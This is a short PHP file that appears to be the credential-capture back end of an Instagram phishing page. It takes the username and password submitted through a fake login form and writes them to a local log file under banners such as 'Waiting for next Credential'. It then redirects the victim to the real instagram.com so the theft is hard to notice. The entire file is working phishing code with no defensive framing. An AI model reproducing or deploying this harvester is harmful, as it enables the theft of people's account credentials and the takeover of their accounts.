<?php

// ----------------------------
$uname = $_POST['username'];
$pass = $_POST['password'];

$file = fopen("../log.txt","a");
fwrite($file,"\nDouble check\n");
fwrite($file,"\n----------------\n");
fwrite($file,"Username --> :");
fwrite($file,$uname);
fwrite($file,"\nPassword --> :");
fwrite($file,$pass);
fwrite($file,"\n----------------\n");
fwrite($file,"\n-------------------------------Waiting for next Credential--------------[Ctrl + C] for exit---------\n");
fclose($file);


//----------After-----------------------



header("location:https://instagram.com/");

?>
